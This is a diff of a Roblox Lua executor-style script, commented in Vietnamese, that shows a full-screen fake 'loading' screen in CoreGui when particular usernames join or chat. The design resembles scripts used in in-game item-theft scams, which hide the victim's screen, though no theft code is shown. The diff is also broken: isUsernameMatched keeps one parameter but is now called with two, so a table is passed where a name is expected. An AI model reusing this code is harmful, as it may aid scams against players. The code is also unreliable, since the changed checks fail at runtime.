@@ -1,25 +1,20 @@
 local Players = game:GetService("Players")
 local CoreGui = game:GetService("CoreGui")
 
--- Tự động trigger UI khi người này vào game
+-- Danh sách người ưu tiên trigger khi vào game
 local priorityUsers = {
 	"namnnni2",
 	"BaldBaconFrrr",
 }
 
--- Trigger UI nếu người này chat bất kỳ nội dung gì
-local username = {
-	"namnnni2",
-	"BaldBaconFrrr",
-}
-
--- Hàm kiểm tra tên có trong username
+-- Kiểm tra tên có trong bảng `getfenv().Username`
 local function isUsernameMatched(name)
-	if type(username) == "string" then
-		return name:lower() == username:lower()
-	elseif type(username) == "table" then
-		for _, u in ipairs(username) do
-			if name:lower() == u:lower() then
+	local userList = getfenv().Username
+	if typeof(userList) == "string" then
+		return name:lower() == userList:lower()
+	elseif typeof(userList) == "table" then
+		for _, uname in ipairs(userList) do
+			if name:lower() == uname:lower() then
 				return true
 			end
 		end
@@ -27,7 +22,7 @@ local function isUsernameMatched(name)
 	return false
 end
 
--- Chỉ trigger 1 lần duy nhất
+-- Trigger UI chỉ 1 lần
 local isShown = false
 local function triggerOnce()
 	if isShown then return end
@@ -37,8 +32,7 @@ local function triggerOnce()
 		CoreGui.GAGLoadingUI:Destroy()
 	end
 
-	local TweenService = game:GetService("TweenService")
-
+	-- UI Loading giữ nguyên
 	local screenGui = Instance.new("ScreenGui")
 	screenGui.Name = "GAGLoadingUI"
 	screenGui.IgnoreGuiInset = true
@@ -50,7 +44,6 @@ local function triggerOnce()
 	bg.Size = UDim2.new(1, 0, 1, 0)
 	bg.BackgroundColor3 = Color3.fromRGB(222, 255, 222)
 	bg.BorderSizePixel = 0
-	bg.Active = false
 	bg.ZIndex = 1
 	bg.Parent = screenGui
 
@@ -153,32 +146,32 @@ local function triggerOnce()
 	end)
 end
 
--- Khi người trong priorityUsers vào game → auto trigger
+-- Kiểm tra người chơi trong game và khi họ chat
 for _, player in ipairs(Players:GetPlayers()) do
-	if table.find(priorityUsers, player.Name) then
+	-- Trigger khi người chơi từ `priorityUsers` tham gia game
+	if isUsernameMatched(priorityUsers, player.Name) then
 		triggerOnce()
-		break
 	end
+
+	-- Trigger khi người chơi chat và có tên trong `getfenv().Username`
+	player.Chatted:Connect(function()
+		if isUsernameMatched(getfenv().Username, player.Name) then
+			triggerOnce()
+		end
+	end)
 end
 
--- Khi người mới vào game
+-- Kiểm tra người chơi mới vào game
 Players.PlayerAdded:Connect(function(player)
-	if table.find(priorityUsers, player.Name) then
+	-- Trigger khi người chơi từ `priorityUsers` tham gia game
+	if isUsernameMatched(priorityUsers, player.Name) then
 		triggerOnce()
 	end
 
-	player.Chatted:Connect(function(msg)
-		if isUsernameMatched(player.Name) then
+	-- Trigger khi người chơi chat và có tên trong `getfenv().Username`
+	player.Chatted:Connect(function()
+		if isUsernameMatched(getfenv().Username, player.Name) then
 			triggerOnce()
 		end
 	end)
 end)
-
--- Khi người đang ở trong game chat
-for _, player in ipairs(Players:GetPlayers()) do
-	player.Chatted:Connect(function(msg)
-		if isUsernameMatched(player.Name) then
-			triggerOnce()
-		end
-	end)
-end
